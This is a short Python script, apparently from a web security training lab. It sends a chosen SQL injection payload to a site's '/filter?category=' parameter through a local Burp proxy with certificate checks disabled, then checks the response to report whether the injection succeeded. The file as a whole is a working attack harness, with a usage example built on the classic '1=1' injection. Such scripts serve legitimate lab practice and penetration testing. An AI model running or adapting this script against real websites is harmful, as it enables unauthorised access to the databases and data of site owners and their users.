import requests
import sys
import urllib3

#Disable TLS Certificate Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Pass the request through the Burp proxy - very useful when debugging
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    # Check the response to determine if SQLi was successful
    if "Picture Box" in r.text:
        return True
    else:
        return False
    
# Define how the script is supposed to be run
if __name__ == "__main__":
    try:
#Define the first argument
        url = sys.argv[1]. strip()
        payload = sys.argv[2].strip()        
# Print usage instructions
    except IndexError:
        print("\n[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
        
# Call function to check if SQLi exists
if exploit_sqli(url, payload):
    print("\n[+] SQL Injection Was Successful!")
else:
    print("\n[-] SQL Injection Failed!")